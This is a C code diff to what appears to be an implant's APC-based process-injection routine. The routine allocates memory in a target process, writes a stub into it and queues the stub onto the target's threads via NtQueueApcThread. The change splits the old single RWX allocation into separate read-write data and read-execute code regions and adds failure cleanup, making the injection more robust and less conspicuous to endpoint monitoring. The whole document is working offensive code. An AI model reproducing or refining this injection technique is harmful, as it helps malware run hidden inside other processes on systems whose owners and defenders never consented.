@@ -51,30 +51,46 @@ static void _migrateit(APCCONTEXT * context) {
 }
 
 /* we push a stub over because we want to create a new thread to allow the original thread to function as normal */
-static char * copycontext(HANDLE hProcess, DWORD pid, APCCONTEXT * context) {
+static char * copycontext(HANDLE hProcess, DWORD pid, APCCONTEXT * context, char ** code_remote_out) {
 	char * ctx_remote;
-	char * ctx_local;
+	char * code_remote;
 	DWORD fnsize = (DWORD)((DWORD_PTR)copycontext - (DWORD_PTR)_migrateit);
 	SIZE_T wrote  = 0;
-	DWORD size   = fnsize + sizeof(APCCONTEXT);
+	DWORD old    = 0;
 
-	/* combine the app context and the function into one place */
-	ctx_local = (char *)malloc(fnsize + sizeof(APCCONTEXT));
-	memcpy(ctx_local,                      (char *)context,    sizeof(APCCONTEXT));
-	memcpy(ctx_local + sizeof(APCCONTEXT), (char *)_migrateit, fnsize);
-
-	/* RWX is necessary because we modify the parameter fired */
-	ctx_remote = (char *)VirtualAllocEx(hProcess, NULL, size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-
-	/* write our process memory */
-	if (ctx_remote != NULL && beacon_WriteProcessMemory(hProcess, ctx_remote, ctx_local, size, &wrote)) {
-		if (wrote != size)
-			ctx_remote = NULL; /* TODO: should ctx_remote be released in the remote hProcess? VirtualFreeEx(hProcess, ctx_remote, 0, MEM_RELEASE); */
+	/* the APC context (data) and the stub (code) go into SEPARATE remote
+	 * allocations: the context must stay writable (the fired flag flips
+	 * remotely) while the code only needs to execute - a single combined
+	 * RWX page is what this used to be. */
+	ctx_remote = (char *)VirtualAllocEx(hProcess, NULL, sizeof(APCCONTEXT), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+	code_remote = (char *)VirtualAllocEx(hProcess, NULL, fnsize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+	if (ctx_remote == NULL || code_remote == NULL) {
+		if (ctx_remote != NULL)
+			VirtualFreeEx(hProcess, ctx_remote, 0, MEM_RELEASE);
+		if (code_remote != NULL)
+			VirtualFreeEx(hProcess, code_remote, 0, MEM_RELEASE);
+		*code_remote_out = NULL;
+		return NULL;
 	}
 
-	/* clean up memory, because we're so good about that */
-	free(ctx_local);
+	/* write our process memory */
+	if (!beacon_WriteProcessMemory(hProcess, ctx_remote, (char *)context, sizeof(APCCONTEXT), &wrote) || wrote != sizeof(APCCONTEXT)) {
+		VirtualFreeEx(hProcess, ctx_remote, 0, MEM_RELEASE);
+		VirtualFreeEx(hProcess, code_remote, 0, MEM_RELEASE);
+		*code_remote_out = NULL;
+		return NULL;
+	}
+	if (!beacon_WriteProcessMemory(hProcess, code_remote, (char *)_migrateit, fnsize, &wrote) || wrote != fnsize) {
+		VirtualFreeEx(hProcess, ctx_remote, 0, MEM_RELEASE);
+		VirtualFreeEx(hProcess, code_remote, 0, MEM_RELEASE);
+		*code_remote_out = NULL;
+		return NULL;
+	}
 
+	/* code is never modified remotely: drop it to RX before any APC runs */
+	VirtualProtectEx(hProcess, code_remote, fnsize, PAGE_EXECUTE_READ, &old);
+
+	*code_remote_out = code_remote;
 	return ctx_remote;
 }
 
@@ -85,6 +101,7 @@ BOOL inject_via_apcthread(INJECTCONTEXT * injctx, LPVOID lpStartAddress, LPVOID 
 	APCCONTEXT       ctx               = { 0 };
 	HANDLE           hThread           = NULL;
 	char *           remote_context    = NULL;
+	char *           remote_code       = NULL;
 	SIZE_T          x                  = 0;
 
 	/* our result */
@@ -104,17 +121,25 @@ BOOL inject_via_apcthread(INJECTCONTEXT * injctx, LPVOID lpStartAddress, LPVOID 
 		return FALSE;
 
 	/* OK, we made it this far, let's mirror our context */
-	remote_context     = copycontext(injctx->hProcess, injctx->pid, &ctx);
+	remote_context     = copycontext(injctx->hProcess, injctx->pid, &ctx, &remote_code);
 	if (remote_context == NULL)
 		return FALSE;
 
 	/* take a snapshot of some threads */
 	hThreadSnap        = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-	if (!hThreadSnap)
+	if (!hThreadSnap) {
+		/* no APCs queued yet - the remote allocations are safe to release */
+		VirtualFreeEx(injctx->hProcess, remote_context, 0, MEM_RELEASE);
+		VirtualFreeEx(injctx->hProcess, remote_code, 0, MEM_RELEASE);
 		return FALSE;
+	}
 
-	if (!Thread32First(hThreadSnap, &t))
+	if (!Thread32First(hThreadSnap, &t)) {
+		CloseHandle(hThreadSnap);
+		VirtualFreeEx(injctx->hProcess, remote_context, 0, MEM_RELEASE);
+		VirtualFreeEx(injctx->hProcess, remote_code, 0, MEM_RELEASE);
 		return FALSE;
+	}
 
 	do {
 		/* Only proceed if we are targeting a thread in the target process */
@@ -126,8 +151,8 @@ BOOL inject_via_apcthread(INJECTCONTEXT * injctx, LPVOID lpStartAddress, LPVOID 
 		if (!hThread)
 			continue;
 
-		/* queue our APC method */
-		pNtQueueApcThread(hThread, remote_context + sizeof(APCCONTEXT), remote_context, 0, 0);
+		/* queue our APC method: routine = the remote stub, context = the remote data */
+		pNtQueueApcThread(hThread, remote_code, remote_context, 0, 0);
 
 		/* close the handle */
 		CloseHandle(hThread);
